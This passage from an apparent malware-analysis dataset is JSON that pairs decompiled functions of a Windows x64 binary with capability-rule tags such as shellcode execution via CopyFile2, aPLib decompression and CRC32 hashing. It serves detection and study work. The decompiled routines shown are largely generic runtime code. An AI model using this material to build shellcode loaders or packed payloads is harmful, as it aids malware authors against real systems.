str.cw[uVar10] ^ *(iVar16 + 0x1400391f1);\n                uVar15 = str.cw[(uVar6 & 0xfffffff0) + (uVar9 & 0xf)] ^ *(iVar16 + 0x1400391f3);\n            }\n            uVar8 = uVar18 ^ uVar8;\n            uVar18 = uVar8;\n            puVar17[0xf] = uVar3 ^ uVar13;\n            puVar17[0x12] = uStack392 ^ uVar15;\n            puVar17[0x10] = uVar8;\n            iVar1 = iVar12 + 2;\n            puVar17[0x11] = uVar4 ^ uVar14;\n            puVar17 = puVar17 + 0x10;\n            iVar12 = iVar12 + 4;\n        } while (iVar1 < 0x2c);\n        iVar12 = 0;\n        if (uStack388 != 0) {\n            iVar16 = &uStack360 - arg4;\n            pauStack376 = arg4 & 0xffffffff00000000 | uStack388 - 1;\n            iStack368 = arg1 - arg4;\n            uVar20 = str.3bcdefgh._0_4_;\n            uVar21 = str.3bcdefgh._4_4_;\n            uVar22 = *0x14003ec38;\n            uVar23 = *0x14003ec3c;\n            do {\n                iVar5 = iStack368;\n                puVar2 = *arg4 + 0xf;\n                fcn.1400018e0(puVar2 + iStack368 + -0xf, arg4, auStack328);\n                if ((&uStack348 + 3U < arg4) || (puVar2 < &uStack360)) {\n                    auVar19 = *arg4 ^ CONCAT412(uVar23, CONCAT48(uVar22, CONCAT44(uVar21, uVar20)));\n                    *arg4 = auVar19;\n                }\n                else {\n                    iVar11 = 0x10;\n                    pauVar7 = arg4;\n                    do {\n                        (*pauVar7)[0] = (*pauVar7)[0] ^ (*pauVar7)[iVar16];\n                        pauVar7 = *pauVar7 + 1;\n                        iVar11 = iVar11 + -1;\n                        auVar19 = extraout_XMM0;\n                    } while (iVar11 != 0);\n                }\n                uVar20 = *(puVar2 + iVar5 + -0xf);\n                uVar21 = *(puVar2 + iVar5 + -0xb);\n                uVar22 = *(puVar2 + iVar5 + -7);\n                uVar23 = *(puVar2 + iVar5 + -3);\n                uStack360 = uVar20;\n                uStack356 = uVar21;\n                uStack352 = uVar22;\n                uStack348 = uVar23;\n                if (iVar12 == pauStack376) {\n                    uVar3 = *puVar2;\n                    auStack344 = auVar19 & 0x0;\n                    if (uVar3 != 0x10) {\n                        if (0xf < uVar3) break;\n                        fcn.140007990(auStack344, arg4, 0x10 - uVar3);\n                    }\n                    *arg4 = auStack344;\n                }\n                arg4 = arg4[1];\n                iVar16 = iVar16 + -0x10;\n                iVar12 = iVar12 + 1;\n            } while (iVar12 < uStack388);\n        }\n    }\n    fcn.140005b20(uStack88 ^ auStack424);\n    return;\n}\n",
        "token_count": 2753
    },
    "14001ae2": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.14001ae28(ulong *arg1, uchar *arg2, int64_t arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg2_00;\n    uint32_t in_stack_00000030;\n    int32_t aiStack24 [4];\n    \n    fcn.140025258(*arg1, in_stack_00000030 + 1, 1, aiStack24);\n    arg2_00 = (arg3 - (0 < in_stack_00000030)) - (aiStack24[0] == 0x2d);\n    if (arg3 == -1) {\n        arg2_00 = arg3;\n    }\n    iVar1 = fcn.1400250d4(arg2 + (0 < in_stack_00000030) + (aiStack24[0] == 0x2d), arg2_00, in_stack_00000030 + 1, \n                          aiStack24);\n    if (iVar1 == 0) {\n        fcn.14001af24(arg2, arg3, in_stack_00000030);\n    }\n    else {\n        *arg2 = 0;\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "14001b10": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14001b108(ulong *arg1, uchar *arg2, int64_t arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg2_00;\n    uint32_t in_stack_00000030;\n    uchar auStack24 [16];\n    \n    auStack24 = ZEXT816(0);\n    fcn.140025258(*arg1, in_stack_00000030, 0, auStack24);\n    arg2_00 = arg3 - (auStack24._0_4_ == 0x2d);\n    if (arg3 == -1) {\n        arg2_00 = arg3;\n    }\n    iVar1 = fcn.1400250d4(arg2 + (auStack24._0_4_ == 0x2d), arg2_00, auStack24._4_4_ + in_stack_00000030, auStack24);\n    if (iVar1 == 0) {\n        fcn.14001b1e0(arg2, arg3, in_stack_00000030, auStack24);\n    }\n    else {\n        *arg2 = 0;\n    }\n    return;\n}\n",
        "token_count": 271
    },
    "14001b33": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14001b338(ulong *arg1, uchar *arg2, int64_t arg3, ulong arg4)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int64_t arg2_00;\n    char *pcVar3;\n    int32_t iVar4;\n    uint32_t in_stack_00000030;\n    uchar auStack24 [16];\n    \n    auStack24 = ZEXT816(0);\n    fcn.140025258(*arg1, in_stack_00000030, 0, auStack24);\n    iVar4 = auStack24._4_4_ + -1;\n    arg2_00 = arg3 - (auStack24._0_4_ == 0x2d);\n    if (arg3 == -1) {\n        arg2_00 = arg3;\n    }\n    iVar2 = fcn.1400250d4(arg2 + (auStack24._0_4_ == 0x2d), arg2_00, in_stack_00000030, auStack24);\n    if (iVar2 == 0) {\n        auStack24._4_4_ = auStack24._4_4_ + -1;\n        if ((auStack24._4_4_ < -4) || (in_stack_00000030 <= auStack24._4_4_)) {\n            fcn.14001af24(arg2, arg3, in_stack_00000030);\n        }\n        else {\n            pcVar1 = arg2 + (auStack24._0_4_ == 0x2d);\n            if (iVar4 < auStack24._4_4_) {\n                do {\n                    pcVar3 = pcVar1;\n                    pcVar1 = pcVar3 + 1;\n                } while (*pcVar3 != '\\0');\n                pcVar3[-1] = '\\0';\n            }\n            fcn.14001b1e0(arg2, arg3, in_stack_00000030, auStack24);\n        }\n    }\n    else {\n        *arg2 = 0;\n    }\n    return;\n}\n",
        "token_count": 470
    },
    "14001d15": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.14001d158(int64_t *param_1, ulong param_2, ulong param_3)\n\n{\n    ulong uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint8_t *puVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    ulong uStack64;\n    \n    uStack64 = 0x14001d172;\n    iVar4 = fcn.140006180();\n    iVar4 = -iVar4;\n    *(&stack0x00001008 + iVar4) = *0x14003e020 ^ &stack0xffffffffffffffc8 + iVar4;\n    *(&stack0xffffffffffffffc0 + iVar4) = 0x14001d195;\n    uVar2 = fcn.14001bbb4(param_1);\n    iVar10 = 0;\n    if (*(param_1 + 2) != 0) {\n        uVar7 = uVar2 & 0x3f;\n        iVar9 = uVar2 >> 6;\n        iVar5 = (*param_1 - param_1[1]) / 2;\n        uVar1 = *(*(iVar9 * 8 + 0x1400403d0) + 0x30 + uVar7 * 0x48);\n        *(&stack0xffffffffffffffc0 + iVar4) = 0x14001d1ec;\n        iVar6 = fcn.14001e294(uVar2 & 0xffffffff, uVar1, 0, param_3);\n        iVar9 = *(iVar9 * 8 + 0x1400403d0);\n        if (iVar6 == *(iVar9 + 0x30 + uVar7 * 0x48)) {\n            uVar1 = *(iVar9 + 0x28 + uVar7 * 0x48);\n            *(&stack0xffffffffffffffe8 + iVar4) = 0;\n            *(&stack0xffffffffffffffc0 + iVar4) = 0x14001d229;\n            iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                              (uVar1, &stack0x00000008 + iVar4, 0x1000, &stack0xfffffffffffffff8 + iVar4);\n            if (iVar3 != 0) {\n                *(&stack0xffffffffffffffc0 + iVar4) = 0x14001d23e;\n                iVar9 = fcn.14001e294(uVar2, param_2, 0, param_3);\n                if ((-1 < iVar9) && (iVar5 <= *(&stack0xfffffffffffffff8 + iVar4))) {\n                    puVar8 = &stack0x00000008 + iVar4;\n                    if (iVar5 != 0) {\n                        do {\n                            if (&stack0x00000008 + *(&stack0xfffffffffffffff8 + iVar4) + iVar4 <= puVar8) break;\n                            if (*puVar8 == 0xd) {\n                                if ((puVar8 < &stack0x00000008 + *(&stack0xfffffffffffffff8 + iVar4) + iVar4 + -1) &&\n                                   (puVar8[1] == 10)) {\n                                    puVar8 = puVar8 + 1;\n                                }\n                            }\n                            else {\n                                puVar8 = puVar8 + *(*puVar8 + 0x14003e420);\n                            }\n                            iVar10 = iVar10 + 1;\n                            puVar8 = puVar8 + 1;\n                        } while (iVar10 != iVar5);\n                    }\n                }\n            }\n        }\n    }\n    *(&stack0xffffffffffffffc0 + iVar4) = 0x14001d2bf;\n    fcn.140005b20(*(&stack0x00001008 + iVar4) ^ &stack0xffffffffffffffc8 + iVar4);\n    return;\n}\n",
        "token_count": 871
    },
    "14002155": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.140021554(ulong arg1, ulong noname_1, int64_t arg3, ulong *arg4)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    uint *arg2;\n    uint *puVar15;\n    uint *puVar16;\n    uint *puVar17;\n    int64_t iVar18;\n    int64_t iVar19;\n    int64_t iStackX24;\n    ulong *puStackX32;\n    uchar auStack616 [4];\n    uint uStack612;\n    uint auStack608 [2];\n    int64_t *piStack600;\n    ulong **ppuStack592;\n    uint auStack584 [140];\n    \n    iStackX24 = arg3;\n    puStackX32 = arg4;\n    fcn.1400217c4(arg3, arg4);\n    uVar13 = fcn.140021254(arg1);\n    if (uVar13 == *(*(iStackX24 + 0x88) + 4)) {\n        iVar14 = 0;\n    }\n    else {\n        arg2 = fcn.14001a93c(0x228);\n        if (arg2 == NULL) {\n            fcn.140019b4c(0);\n            iVar14 = -1;\n        }\n        else {\n            iVar18 = 4;\n            iVar19 = 4;\n            puVar16 = *(iStackX24 + 0x88);\n            puVar12 = auStack584;\n            do {\n                puVar17 = puVar12;\n                puVar15 = puVar16;\n                uVar4 = puVar15[1];\n                uVar5 = puVar15[2];\n                uVar6 = puVar15[3];\n                uVar7 = puVar15[4];\n                uVar8 = puVar15[5];\n                uVar9 = puVar15[6];\n                uVar10 = puVar15[7];\n                *puVar17 = *puVar15;\n                puVar17[1] = uVar4;\n                puVar17[2] = uVar5;\n                puVar17[3] = uVar6;\n                uVar4 = puVar15[8];\n                uVar5 = puVar15[9];\n                uVar6 = puVar15[10];\n                uVar11 = puVar15[0xb];\n                puVar17[4] = uVar7;\n                puVar17[5] = uVar8;\n                puVar17[6] = uVar9;\n                puVar17[7] = uVar10;\n                uVar7 = puVar15[0xc];\n                uVar8 = puVar15[0xd];\n                uVar9 = puVar15[0xe];\n                uVar10 = puVar15[0xf];\n                puVar17[8] = uVar4;\n                puVar17[9] = uVar5;\n                puVar17[10] = uVar6;\n                puVar17[0xb] = uVar11;\n                uVar4 = puVar15[0x10];\n                uVar5 = puVar15[0x11];\n                uVar6 = puVar15[0x12];\n                uVar11 = puVar15[0x13];\n                puVar17[0xc] = uVar7;\n                puVar17[0xd] = uVar8;\n                puVar17[0xe] = uVar9;\n                puVar17[0xf] = uVar10;\n                uVar7 = puVar15[0x14];\n                uVar8 = puVar15[0x15];\n                uVar9 = puVar15[0x16];\n                uVar10 = puVar15[0x17];\n                puVar17[0x10] = uVar4;\n                puVar17[0x11] = uVar5;\n                puVar17[0x12] = uVar6;\n                puVar17[0x13] = uVar11;\n                uVar4 = puVar15[0x18];\n                uVar5 = puVar15[0x19];\n                uVar6 = puVar15[0x1a];\n                uVar11 = puVar15[0x1b];\n                puVar17[0x14] = uVar7;\n                puVar17[0x15] = uVar8;\n                puVar17[0x16] = uVar9;\n                puVar17[0x17] = uVar10;\n                uVar7 = puVar15[0x1c];\n                uVar8 = puVar15[0x1d];\n                uVar9 = puVar15[0x1e];\n                uVar10 = puVar15[0x1f];\n                puVar17[0x18] = uVar4;\n                puVar17[0x19] = uVar5;\n                puVar17[0x1a] = uVar6;\n                puVar17[0x1b] = uVar11;\n                puVar17[0x1c] = uVar7;\n                puVar17[0x1d] = uVar8;\n                puVar17[0x1e] = uVar9;\n                puVar17[0x1f] = uVar10;\n                iVar19 = iVar19 + -1;\n                puVar16 = puVar15 + 0x20;\n                puVar12 = puVar17 + 0x20;\n            } while (iVar19 != 0);\n            uVar4 = puVar15[0x21];\n            uVar5 = puVar15[0x22];\n            uVar6 = puVar15[0x23];\n            uVar7 = puVar15[0x24];\n            uVar8 = puVar15[0x25];\n            uVar9 = puVar15[0x26];\n            uVar10 = puVar15[0x27];\n            uVar2 = *(puVar15 + 0x28);\n            puVar17[0x20] = puVar15[0x20];\n            puVar17[0x21] = uVar4;\n            puVar17[0x22] = uVar5;\n            puVar17[0x23] = uVar6;\n            puVar17[0x24] = uVar7;\n            puVar17[0x25] = uVar8;\n            puVar17[0x26] = uVar9;\n            puVar17[0x27] = uVar10;\n            *(puVar17 + 0x28) = uVar2;\n            puVar16 = auStack584;\n            puVar12 = arg2;\n            do {\n                puVar17 = puVar12;\n                puVar15 = puVar16;\n                uVar4 = puVar15[1];\n                uVar5 = puVar15[2];\n                uVar6 = puVar15[3];\n                uVar7 = puVar15[4];\n                uVar8 = puVar15[5];\n                uVar9 = puVar15[6];\n                uVar10 = puVar15[7];\n                *puVar17 = *puVar15;\n                puVar17[1] = uVar4;\n                puVar17[2] = uVar5;\n                puVar17[3] = uVar6;\n                uVar4 = puVar15[8];\n                uVar5 = puVar15[9];\n                uVar6 = puVar15[10];\n                uVar11 = puVar15[0xb];\n                puVar17[4] = uVar7;\n                puVar17[5] = uVar8;\n                puVar17[6] = uVar9;\n                puVar17[7] = uVar10;\n                uVar7 = puVar15[0xc];\n                uVar8 = puVar15[0xd];\n                uVar9 = puVar15[0xe];\n                uVar10 = puVar15[0xf];\n                puVar17[8] = uVar4;\n                puVar17[9] = uVar5;\n                puVar17[10] = uVar6;\n                puVar17[0xb] = uVar11;\n                uVar4 = puVar15[0x10];\n                uVar5 = puVar15[0x11];\n                uVar6 = puVar15[0x12];\n                uVar11 = puVar15[0x13];\n                puVar17[0xc] = uVar7;\n                puVar17[0xd] = uVar8;\n                puVar17[0xe] = uVar9;\n                puVar17[0xf] = uVar10;\n                uVar7 = puVar15[0x14];\n                uVar8 = puVar15[0x15];\n                uVar9 = puVar15[0x16];\n                uVar10 = puVar15[0x17];\n                puVar17[0x10] = uVar4;\n                puVar17[0x11] = uVar5;\n                puVar17[0x12] = uVar6;\n                puVar17[0x13] = uVar11;\n                uVar4 = puVar15[0x18];\n                uVar5 = puVar15[0x19];\n                uVar6 = puVar15[0x1a];\n                uVar11 = puVar15[0x1b];\n                puVar17[0x14] = uVar7;\n                puVar17[0x15] = uVar8;\n                puVar17[0x16] = uVar9;\n                puVar17[0x17] = uVar10;\n                uVar7 = puVar15[0x1c];\n                uVar8 = puVar15[0x1d];\n                uVar9 = puVar15[0x1e];\n                uVar10 = puVar15[0x1f];\n                puVar17[0x18] = uVar4;\n                puVar17[0x19] = uVar5;\n                puVar17[0x1a] = uVar6;\n                puVar17[0x1b] = uVar11;\n                puVar17[0x1c] = uVar7;\n                puVar17[0x1d] = uVar8;\n                puVar17[0x1e] = uVar9;\n                puVar17[0x1f] = uVar10;\n                iVar18 = iVar18 + -1;\n                puVar16 = puVar15 + 0x20;\n                puVar12 = puVar17 + 0x20;\n            } while (iVar18 != 0);\n            uVar4 = puVar15[0x21];\n            uVar5 = puVar15[0x22];\n            uVar6 = puVar15[0x23];\n            uVar7 = puVar15[0x24];\n            uVar8 = puVar15[0x25];\n            uVar9 = puVar15[0x26];\n            uVar10 = puVar15[0x27];\n            uVar2 = *(puVar15 + 0x28);\n            puVar17[0x20] = puVar15[0x20];\n            puVar17[0x21] = uVar4;\n            puVar17[0x22] = uVar5;\n            puVar17[0x23] = uVar6;\n            puVar17[0x24] = uVar7;\n            puVar17[0x25] = uVar8;\n            puVar17[0x26] = uVar9;\n            puVar17[0x27] = uVar10;\n            *(puVar17 + 0x28) = uVar2;\n            *arg2 = 0;\n            iVar14 = fcn.1400218f8(uVar13, arg2);\n            if (iVar14 == -1) {\n                puVar16 = fcn.140012c78();\n                *puVar16 = 0x16;\n                fcn.140019b4c(arg2);\n                iVar14 = -1;\n            }\n            else {\n                if (noname_1 == '\\0') {\n                    fcn.140016f1c();\n                }\n                piVar3 = *(iStackX24 + 0x88);\n                LOCK();\n                iVar1 = *piVar3;\n                *piVar3 = *piVar3 + -1;\n                if ((iVar1 == 1) && (*(iStackX24 + 0x88) != 0x14003e6d0)) {\n                    fcn.140019b4c(*(iStackX24 + 0x88));\n                }\n                *arg2 = 1;\n                *(iStackX24 + 0x88) = arg2;\n                if ((*0x14003e520 & *(iStackX24 + 0x3a8)) == 0) {\n                    piStack600 = &iStackX24;\n                    ppuStack592 = &puStackX32;\n                    uStack612 = 5;\n                    auStack608[0] = 5;\n                    fcn.140021084(auStack616, auStack608, &piStack600, &uStack612);\n                    if (noname_1 != '\\0') {\n                        *0x14003e3c0 = *puStackX32;\n                    }\n                }\n                fcn.140019b4c(0);\n            }\n        }\n    }\n    return iVar14;\n}\n",
        "token_count": 3037
    },
    "1400240f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.1400240f4(int16_t *arg1, uint32_t *arg2, int16_t **arg3)\n\n{\n    int16_t **ppiVar1;\n    int16_t **ppiVar2;\n    ushort *arg3_00;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    int16_t *piVar7;\n    uint32_t *noname_1;\n    ulong uVar8;\n    int16_t **ppiVar9;\n    int64_t iVar10;\n    \n    noname_1 = arg2;\n    ppiVar9 = arg3;\n    iVar6 = fcn.140019774(arg1, arg2);\n    ppiVar2 = iVar6 + 0x98;\n    *(iVar6 + 0xa8) = 0;\n    arg3_00 = iVar6 + 0x2f0;\n    *ppiVar2 = arg1;\n    ppiVar1 = iVar6 + 0xa0;\n    *arg3_00 = 0;\n    *ppiVar1 = arg1 + 0x40;\n    piVar7 = arg1;\n    if (arg1[0x40] != 0) {\n        noname_1 = 0x16;\n        ppiVar9 = ppiVar1;\n        fcn.140024058(0x140033fe0, 0x16, ppiVar1);\n        piVar7 = *ppiVar2;\n    }\n    if (*piVar7 == 0) {\n        fcn.140023940(ppiVar2);\ncode_r0x0001400241c4:\n        if (*(iVar6 + 0xa8) == 0) {\n            return 0;\n        }\n    }\n    else {\n        if (**ppiVar1 == 0) {\n            fcn.140023ab8(ppiVar2, noname_1, ppiVar9);\n        }\n        else {\n            fcn.1400239e8(ppiVar2, noname_1, ppiVar9);\n        }\n        if (*(iVar6 + 0xa8) == 0) {\n            uVar8 = 0x40;\n            ppiVar9 = ppiVar2;\n            iVar4 = fcn.140024058(0x140033bc0, 0x40, ppiVar2);\n            if (iVar4 != 0) {\n                if (**ppiVar1 == 0) {\n                    fcn.140023ab8(ppiVar2, uVar8, ppiVar9);\n                }\n                else {\n                    fcn.1400239e8(ppiVar2, uVar8, ppiVar9);\n                }\n            }\n            goto code_r0x0001400241c4;\n        }\n    }\n    if ((*arg1 == 0) && (arg1[0x80] == 0)) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetACP)();\n    }\n    else {\n        uVar5 = fcn.140023f28(arg1 + 0x80, ppiVar2);\n    }\n    if (((uVar5 != 0) && (uVar5 != 65000)) &&\n       (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(uVar5 & 0xffff),  iVar4 != 0)) {\n        if (arg2 != NULL) {\n            *arg2 = uVar5;\n        }\n        if (arg3 == NULL) {\n            return 1;\n        }\n        ppiVar1 = arg3 + 0x24;\n        *ppiVar1 = 0;\n        iVar6 = -1;\n        do {\n            iVar10 = iVar6;\n            iVar6 = iVar10 + 1;\n        } while (arg3_00[iVar6] != 0);\n        iVar4 = fcn.1400205a0(ppiVar1, 0x55, arg3_00, iVar10 + 2);\n        if (iVar4 != 0) {\ncode_r0x000140024342:\n            fcn.14000c078(0, 0, 0, 0, 0);\n            pcVar3 = swi(3);\n            uVar8 = (*pcVar3)();\n            return uVar8;\n        }\n        iVar4 = fcn.14001a040(ppiVar1, 0x1001, arg3, 0x40);\n        if (iVar4 != 0) {\n            ppiVar2 = arg3 + 0x10;\n            iVar4 = fcn.14001a040(ppiVar1, 0x1002, ppiVar2, 0x40);\n            if ((iVar4 != 0) &&\n               (((iVar6 = fcn.140029aec(ppiVar2),  iVar6 == 0 && (iVar6 = fcn.140029aec(ppiVar2),  iVar6 == 0)) ||\n                (iVar4 = fcn.14001a040(ppiVar1, 7, ppiVar2, 0x40),  iVar4 != 0)))) {\n                if (uVar5 != 0xfde9) {\n                    fcn.140027f44(uVar5, arg3 + 0x20, 0x10, 10);\n                    return 1;\n                }\n                iVar4 = fcn.1400205a0(arg3 + 0x20, 0x10, L\"utf8\", 5);\n                if (iVar4 == 0) {\n                    return 1;\n                }\n                goto code_r0x000140024342;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1241
    },
    "14000804": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.140008040(uchar (*arg1) [16], ulong noname_1, uint64_t arg3)\n\n{\n    uchar (*pauVar1) [16];\n    uchar (*pauVar2) [16];\n    uint16_t uVar3;\n    uint64_t uVar5;\n    uchar auVar6 [12];\n    uint32_t uVar4;\n    uchar auVar7 [13];\n    uchar auVar8 [16];\n    uchar uVar9;\n    \n    uVar5 = noname_1 * 0x101010101010101;\n    uVar3 = uVar5;\n    uVar4 = uVar5;\n    if (arg3 < 0x11) {\n        uVar9 = uVar5;\n    // switch table (17 cases) at 0x1400440b0\n        switch(*(arg3 * 4 + 0x1400440b0) + 0x140000000) {\n        case 0x140008170:\n            *(arg1[-1] + arg3 + 1) = uVar5;\n        case 0x140008174:\n            *(arg1[-1] + arg3 + 9) = uVar4;\n        case 0x140008177:\n            *(arg1[-1] + arg3 + 0xd) = uVar3;\n        case 0x14000817b:\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x14000817e:\n            return arg1;\n        case 0x140008180:\n            *(arg1[-1] + arg3 + 4) = uVar5;\n        case 0x140008184:\n            *(arg1[-1] + arg3 + 0xc) = uVar4;\n            return arg1;\n        case 0x140008188:\n            *(arg1[-1] + arg3 + 7) = uVar5;\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x140008190:\n            *(arg1[-1] + arg3 + 3) = uVar5;\n        case 0x140008194:\n            *(arg1[-1] + arg3 + 0xb) = uVar4;\n            arg1[-1][arg3 + 0xf] = uVar9;\n            return arg1;\n        case 0x1400081a0:\n            *(arg1[-1] + arg3 + 2) = uVar5;\n        case 0x1400081a4:\n            *(arg1[-1] + arg3 + 10) = uVar4;\n        case 0x1400081a7:\n            *(arg1[-1] + arg3 + 0xe) = uVar3;\n            return arg1;\n        case 0x1400081ac:\n            **arg1 = uVar5;\n            return arg1;\n        case 0x1400081b0:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar3;\n            (*arg1)[10] = uVar9;\n            return arg1;\n        case 0x1400081c0:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar3;\n            return arg1;\n        case 0x1400081c8:\n            **arg1 = uVar5;\n            *(*arg1 + 8) = uVar5;\n            return arg1;\n        }\n    }\n    uVar9 = SUB141(ZEXT814(uVar5) >> 0x30, 0);\n    auVar7 = ZEXT813(uVar5);\n    auVar6 = ZEXT812(uVar5);\n    auVar8 = CONCAT142(SUB1614(CONCAT133(SUB1613(CONCAT124(SUB1612(CONCAT115(SUB1611(CONCAT106(SUB1610(CONCAT97(SUB169(\n                                                            CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(SUB166(CONCAT511(\n                                                            SUB165(CONCAT412(SUB164(CONCAT313(SUB163(CONCAT214(SUB162(\n                                                            CONCAT115(SUB161(ZEXT816(uVar5) >> 0x38, 0), \n                                                                      CONCAT114(SUB151(ZEXT815(uVar5) >> 0x38, 0), \n                                                                                ZEXT814(uVar5))) >> 0x70, 0), \n                                                            CONCAT113(uVar9, auVar7)) >> 0x68, 0), \n                                                            CONCAT112(uVar9, auVar6)) >> 0x60, 0), \n                                                            CONCAT111(SUB131(auVar7 >> 0x28, 0), ZEXT811(uVar5))) >>\n                                                            0x58, 0), CONCAT110(SUB121(auVar6 >> 0x28, 0), uVar5)) >>\n                                                            0x50, 0), CONCAT19(SUB131(auVar7 >> 0x20, 0), uVar5)) >>\n                                                            0x48, 0), CONCAT18(SUB121(auVar6 >> 0x20, 0), uVar5)) >>\n                                                            0x40, 0), (uVar5 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (uVar5 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (uVar5 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (uVar5 >> 0x10) << 0x20) >> 0x20, 0), (uVar4 >> 8) << 0x18)\n                                                 >> 0x18, 0), (uVar5 >> 8) << 0x10) >> 0x10, 0), \n                       uVar3 & 0xff | uVar3 << 8);\n    pauVar1 = arg1;\n    if (0x80 < arg3) {\n        if ((*0x14003fc7c & 2) != 0) {\n            for (; arg3 != 0; arg3 = arg3 - 1) {\n                (*pauVar1)[0] = noname_1;\n                pauVar1 = *pauVar1 + 1;\n            }\n            return arg1;\n        }\n        *arg1 = auVar8;\n        pauVar1 = arg1[1] & 0xfffffffffffffff0;\n        arg3 = arg1 + (arg3 - pauVar1);\n        uVar5 = arg3 >> 7;\n        if (uVar5 != 0) {\n            if (*0x14003e048 < uVar5) {\n                do {\n                    *pauVar1 = auVar8;\n                    pauVar1[1] = auVar8;\n                    pauVar2 = pauVar1[8];\n                    pauVar1[2] = auVar8;\n                    pauVar1[3] = auVar8;\n                    uVar5 = uVar5 - 1;\n                    pauVar1[4] = auVar8;\n                    pauVar1[5] = auVar8;\n                    pauVar1[6] = auVar8;\n                    pauVar1[7] = auVar8;\n                    pauVar1 = pauVar2;\n                } while (uVar5 != 0);\n                arg3 = arg3 & 0x7f;\n            }\n            else {\n                do {\n                    *pauVar1 = auVar8;\n                    pauVar1[1] = auVar8;\n                    pauVar2 = pauVar1[8];\n                    pauVar1[2] = auVar8;\n                    pauVar1[3] = auVar8;\n                    uVar5 = uVar5 - 1;\n                    pauVar1[4] = auVar8;\n                    pauVar1[5] = auVar8;\n                    pauVar1[6] = auVar8;\n                    pauVar1[7] = auVar8;\n                    pauVar1 = pauVar2;\n                } while (uVar5 != 0);\n                arg3 = arg3 & 0x7f;\n            }\n        }\n    }\n    for (uVar5 = arg3 >> 4; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *pauVar1 = auVar8;\n        pauVar1 = pauVar1[1];\n    }\n    if ((arg3 & 0xf) != 0) {\n        *(pauVar1[-1] + (arg3 & 0xf)) = auVar8;\n    }\n    return arg1;\n}\n",
        "token_count": 1933
    },
    "14000254": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nint64_t ** fcn.140002540(int64_t **arg1, ulong arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int64_t **ppiVar4;\n    int64_t *piVar5;\n    uint64_t arg1_00;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    \n    piVar1 = arg1[3];\n    if (arg3 <= piVar1) {\n        ppiVar4 = arg1;\n        if (0xf < piVar1) {\n            ppiVar4 = *arg1;\n        }\n        arg1[2] = arg3;\n        fcn.140007990(ppiVar4, arg2, arg3);\n        *(arg3 + ppiVar4) = 0;\n        return arg1;\n    }\n    if (0x7fffffffffffffff < arg3) {\n        fcn.1400012b0();\n        pcVar2 = swi(3);\n        ppiVar4 = (*pcVar2)();\n        return ppiVar4;\n    }\n    piVar5 = arg3 | 0xf;\n    piVar7 = 0x7fffffffffffffff;\n    if (((piVar5 < 0x8000000000000000) && (piVar1 <= 0x7fffffffffffffff - (piVar1 >> 1))) &&\n       (piVar6 = (piVar1 >> 1) + piVar1,  piVar7 = piVar5,  piVar5 < piVar6)) {\n        piVar7 = piVar6;\n    }\n    arg1_00 = piVar7 + 1;\n    if (piVar7 == 0xffffffffffffffff) {\n        arg1_00 = 0xffffffffffffffff;\n    }\n    if (arg1_00 < 0x1000) {\n        if (arg1_00 == 0) {\n            piVar5 = NULL;\n        }\n        else {\n            piVar5 = fcn.140005b40(arg1_00);\n        }\n    }\n    else {\n        if (arg1_00 + 0x27 <= arg1_00) {\n            fcn.140001210();\n            pcVar2 = swi(3);\n            ppiVar4 = (*pcVar2)();\n            return ppiVar4;\n        }\n        iVar3 = fcn.140005b40(arg1_00 + 0x27);\n        if (iVar3 == 0) goto code_r0x000140002690;\n        piVar5 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        piVar5[-1] = 